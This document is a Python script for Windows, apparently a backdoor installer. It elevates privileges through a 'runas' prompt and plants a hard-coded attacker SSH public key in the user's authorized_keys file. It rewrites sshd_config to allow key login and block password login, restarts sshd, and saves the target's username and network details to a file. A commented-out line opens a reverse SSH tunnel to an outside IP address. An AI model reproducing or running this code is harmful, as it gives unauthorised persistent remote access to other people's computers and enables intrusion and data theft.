# -*- coding: UTF-8 -*-
import os
import ctypes
import sys
import time

authorized_keys_1 = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsUTeipFc1A2jNPIN+3/3i9aTC9F2W/IahFTVo" \
                    "9j2WusX/8J/CwNp66tDc5sRS9KGrbN7ox0e+2w/EnQZpuLoCFNb86N+ZZbsMpg6eueIrPsImpsYc" \
                    "CT3RpuXpmbbqNS5xnNhVxYU9xTKd7OaUmSOS35m/1I6+cIwsmNGnMT4QsWJ4PEmZkdkvkDqWDgXL" \
                    "qPgzTkus7Ii5tBa2oof+EaCACxMwizOVLpigJwXdV8V2AG5RzprkE7ay9TyCLO5vJfu6ukZtEs+y" \
                    "688H+FFHCPIHYxKbmGai5zqc5clZYFiQmLE4m2oc520k/iodV7Wt97xLf3opNR9IGfmv6LzXNiPK" \
                    "6/H+g+yCH9oGw3zoir8l5Jf1nSl69Q6dn2GDjDAp2Sn5ZddHnlMJ9LApvT+v+6VT6OdE1I287lOX" \
                    "wHlMNmc6ZC42v0YfxqMg8FidbpgiEp3A1cQJLwwZ/+0Ak13xPO/BXflCeU9SuzqgOMne55WEkXnK" \
                    "dPtntCptsqyQlNLcyhM= root@nBcLUfYrRP"

authorized_keys_2 = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDGvn7Np0cD3Gg+TBzgi6gR2t2ojkpCDmiqz73g" \
                    "KWgz/7+Ddes/xvwEOR0UZRb99lRbcULaV8kYxOV1CagnLSy7eHehAOG3RxjiMimNaWbXg9VrGvqI" \
                    "4XzwpxAyHwQcUyVUhCvpyV7fws64+KfGZE68mFDbktruvuD+H2b96Ug5rWXWdvfrFGCClW4NfcV+" \
                    "C5DMgRe5kUFGHQNvWhlJCVyNnyN5U2EAel3iVpsBmJp6vjkFJidF5d/1DG90c1FzGnY44jPay+Ne" \
                    "CgnWenE/ro80P6HSzi3sgH1wIh1Bq1MQwkZUv2Flqc6MdPnqKbWzB+YVRohk2pRMeTvH+Sd+W3ZQ" \
                    "dA8wwV+U3cTW30gIcnTsUnWNfjRBb43gfYT1g5dJWz41NenD/5/PmXe0kp3Ti4VVt/fNY+igKMKF" \
                    "RbM8XA/lM8do9aQyUgsHuhDyQ6Yo2MSwb/icu5Dc+rJd7Mn3BM8P8TU3x94sIjlJZop0So1+hWkB" \
                    "FlYMnDC+DVDf7dGXgCM= administrator@10_0_4_13"

authorized_keys_path = ".\\"

sshd_config_path = "C:\\ProgramData\\ssh\\"
sshd_config_replace_target_1 = "Match Group administrators"
sshd_config_replace_target_2 = "AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys"
sshd_config_append_1 = "PubkeyAuthentication yes\n"
sshd_config_append_2 = "AuthorizedKeysFile	.ssh/authorized_keys\n"
sshd_config_append_3 = "PasswordAuthentication no\n"


def execute_administrator_privileges(cmd):
    privilege_status = ctypes.windll.shell32.IsUserAnAdmin()
    if privilege_status == 0:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:
        # recode = subprocess.Popen(cmd, shell=True)
        os.popen("net stop sshd")
        os.popen("net stop mysql")


def alter_sshd_config():
    # 删掉
    sshd_config_file = open(sshd_config_path + "sshd_config", 'r+', encoding='utf-8')
    file_lines = sshd_config_file.readlines()
    sshd_config_file.seek(0)
    sshd_config_file.truncate()
    for line in file_lines:
        while line.find(sshd_config_replace_target_1) != -1:
            line = line.replace(sshd_config_replace_target_1, "", 1)
        while line.find(sshd_config_replace_target_2) != -1:
            line = line.replace(sshd_config_replace_target_2, "", 1)

        while line.find(sshd_config_append_1) != -1:
            line = line.replace(sshd_config_append_1, "", 1)
        while line.find(sshd_config_append_2) != -1:
            line = line.replace(sshd_config_append_2, "", 1)
        while line.find(sshd_config_append_3) != -1:
            line = line.replace(sshd_config_append_3, "", 1)
        sshd_config_file.write(line)
    sshd_config_file.close()

    # 添加
    sshd_config_file = open(sshd_config_path + "sshd_config", 'a', encoding='utf-8')

    sshd_config_file.write(sshd_config_append_1)
    sshd_config_file.write(sshd_config_append_2)
    sshd_config_file.write(sshd_config_append_3)
    sshd_config_file.close()


def alter_authorized_keys():
    authorized_keys_file = open(authorized_keys_path + "authorized_keys", 'w')
    authorized_keys_file.write(authorized_keys_1)


if __name__ == "__main__":
    os.system('chcp 65001')

    target_user = os.popen("echo %username%").read()
    authorized_keys_path = "C:\\Users\\" + str(target_user).strip() + "\\.ssh\\"
    # execute_administrator_privileges("net stop sshd")
    privilege_status = ctypes.windll.shell32.IsUserAnAdmin()
    if privilege_status == 0:
        if getattr(sys, 'main', False):
            pathname = os.path.dirname(sys.executable)
        else:
            pathname = os.path.split(os.path.realpath(__file__))[0]
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, pathname, None, 1)
    else:
        alter_authorized_keys()
        print(os.popen("whoami").read())
        alter_sshd_config()

        os.popen("net stop sshd")
        os.popen("net start sshd")

        target_user = os.popen("echo %username%").read()
        target_ip = os.popen("ipconfig /all").read()
        target_info = open(".//target_info.txt", 'w')
        target_info.write("target_user : " + target_user + "\n")
        target_info.write("target_ip : " + target_ip + "\n")

        # os.popen("ssh -f -N -R localhost:8022:localhost:22 Administrator@1.117.207.149")
